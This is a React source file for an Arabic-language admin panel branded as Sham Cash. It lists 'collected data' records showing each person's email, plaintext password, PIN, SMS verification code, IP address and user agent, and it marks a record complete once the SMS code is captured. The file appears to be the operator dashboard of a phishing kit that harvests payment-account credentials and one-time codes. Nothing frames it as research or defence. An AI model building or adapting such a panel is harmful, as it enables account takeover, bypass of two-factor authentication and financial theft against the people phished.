import { useLocation } from "wouter";
import { useQuery, useMutation } from "@tanstack/react-query";
import { type CollectedData } from "@shared/schema";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { Button } from "@/components/ui/button";
import { Avatar, AvatarFallback } from "@/components/ui/avatar";
import { Badge } from "@/components/ui/badge";
import { LogOut, Users, Mail, Lock, Hash, MessageSquare, Calendar, Globe } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";

interface AdminUser {
  id: string;
  username: string;
  role: string;
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();

  // Check if admin is logged in via session
  const { data: adminResponse, isLoading: isLoadingAdmin, error: adminError } = useQuery<{ success: boolean; admin: AdminUser }>({
    queryKey: ["/api/admin/me"],
    retry: false,
  });

  const admin = adminResponse?.admin || null;

  // Redirect to login if not authenticated
  if (adminError || (!isLoadingAdmin && !admin)) {
    setLocation("/admin/login");
    return null;
  }

  const { data: collectedDataResponse, isLoading } = useQuery<{ success: boolean; data: CollectedData[]; adminRole: string }>({
    queryKey: ["/api/admin/collected-data"],
    enabled: !!admin,
  });

  const collectedData: CollectedData[] = collectedDataResponse?.data || [];

  const logoutMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("POST", "/api/admin/logout", {});
    },
    onSuccess: () => {
      queryClient.clear();
      setLocation("/admin/login");
    },
  });

  const isAdmin = admin?.role === "admin";

  const handleLogout = () => {
    logoutMutation.mutate();
  };

  if (!admin) {
    return null;
  }

  // Generate avatar color based on email
  const getAvatarColor = (email: string) => {
    const colors = [
      "bg-blue-500",
      "bg-green-500",
      "bg-yellow-500",
      "bg-purple-500",
      "bg-pink-500",
      "bg-indigo-500",
      "bg-red-500",
      "bg-teal-500",
    ];
    const index = email.charCodeAt(0) % colors.length;
    return colors[index];
  };

  // Get initials from email
  const getInitials = (email: string) => {
    return email.charAt(0).toUpperCase();
  };

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="border-b bg-card sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Users className="w-6 h-6 text-primary" />
            <div>
              <h1 className="text-xl font-bold">شام كاش - لوحة الإدارة</h1>
              <div className="text-sm text-muted-foreground flex items-center gap-2">
                مرحباً، {admin.username}
                {isAdmin && (
                  <Badge variant="default" className="text-xs">
                    مدير
                  </Badge>
                )}
              </div>
            </div>
          </div>
          <Button
            variant="outline"
            onClick={handleLogout}
            data-testid="button-logout"
          >
            <LogOut className="w-4 h-4 ml-2" />
            تسجيل الخروج
          </Button>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-4xl">
        <div className="mb-6 flex items-center justify-between">
          <h2 className="text-lg font-semibold text-muted-foreground">
            {collectedData.length} سجل
          </h2>
        </div>

        {isLoading ? (
          <div className="flex items-center justify-center py-12">
            <p className="text-muted-foreground">جاري تحميل البيانات...</p>
          </div>
        ) : collectedData.length === 0 ? (
          <div className="flex items-center justify-center py-12">
            <p className="text-muted-foreground">لا توجد سجلات حتى الآن</p>
          </div>
        ) : (
          <div className="space-y-3">
            {collectedData.map((record) => (
              <div
                key={record.id}
                data-testid={`card-collected-${record.id}`}
                className="bg-card rounded-lg border p-4 hover-elevate active-elevate-2 transition-all"
              >
                <div className="flex gap-4">
                  {/* Avatar */}
                  <Avatar className={`w-12 h-12 ${getAvatarColor(record.email)} flex-shrink-0`}>
                    <AvatarFallback className="text-white font-bold text-lg">
                      {getInitials(record.email)}
                    </AvatarFallback>
                  </Avatar>

                  {/* Content */}
                  <div className="flex-1 min-w-0">
                    {/* Header */}
                    <div className="flex items-start justify-between mb-2">
                      <div className="flex-1 min-w-0">
                        <h3 className="font-semibold text-base truncate">{record.email}</h3>
                        <div className="flex items-center gap-2 mt-1">
                          <span className="text-xs text-muted-foreground flex items-center gap-1">
                            <Calendar className="w-3 h-3" />
                            {format(new Date(record.createdAt), "dd MMM yyyy - HH:mm", { locale: ar })}
                          </span>
                        </div>
                      </div>
                      {record.smsCode && (
                        <Badge variant="default" className="text-xs flex-shrink-0 mr-2">
                          مكتمل
                        </Badge>
                      )}
                    </div>

                    {/* Message-like content */}
                    <div className="bg-muted/50 rounded-lg p-3 space-y-2">
                      {/* Email */}
                      <div className="flex items-start gap-2 text-sm">
                        <Mail className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                        <div className="flex-1 min-w-0">
                          <span className="text-muted-foreground">الحساب:</span>
                          <span className="mr-2 font-mono break-all">{record.email}</span>
                        </div>
                      </div>

                      {/* Password - Admin only */}
                      {isAdmin && record.password && (
                        <div className="flex items-start gap-2 text-sm">
                          <Lock className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
                          <div className="flex-1 min-w-0">
                            <span className="text-muted-foreground">كلمة المرور:</span>
                            <span className="mr-2 font-mono break-all">{record.password}</span>
                            <Badge variant="secondary" className="text-xs mr-2">
                              مدير فقط
                            </Badge>
                          </div>
                        </div>
                      )}

                      {/* PIN */}
                      <div className="flex items-start gap-2 text-sm">
                        <Hash className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                        <div className="flex-1 min-w-0">
                          <span className="text-muted-foreground">رمز PIN:</span>
                          <span className="mr-2 font-mono">{record.pin}</span>
                        </div>
                      </div>

                      {/* SMS Code - Admin only */}
                      {isAdmin && record.smsCode && (
                        <div className="flex items-start gap-2 text-sm">
                          <MessageSquare className="w-4 h-4 text-amber-500 mt-0.5 flex-shrink-0" />
                          <div className="flex-1 min-w-0">
                            <span className="text-muted-foreground">كود SMS:</span>
                            <span className="mr-2 font-mono">{record.smsCode}</span>
                            <Badge variant="secondary" className="text-xs mr-2">
                              مدير فقط
                            </Badge>
                          </div>
                        </div>
                      )}

                      {/* IP Address */}
                      {record.ipAddress && (
                        <div className="flex items-start gap-2 text-sm">
                          <Globe className="w-4 h-4 text-muted-foreground mt-0.5 flex-shrink-0" />
                          <div className="flex-1 min-w-0">
                            <span className="text-muted-foreground">IP:</span>
                            <span className="mr-2 font-mono text-xs">{record.ipAddress}</span>
                          </div>
                        </div>
                      )}

                      {/* Verification time */}
                      {record.verifiedAt && (
                        <div className="text-xs text-muted-foreground pt-1 border-t">
                          تم التحقق: {format(new Date(record.verifiedAt), "dd MMM yyyy - HH:mm", { locale: ar })}
                        </div>
                      )}
                    </div>

                    {/* User Agent - Admin only */}
                    {isAdmin && record.userAgent && (
                      <div className="mt-2 text-xs text-muted-foreground truncate">
                        {record.userAgent}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </main>
    </div>
  );
}
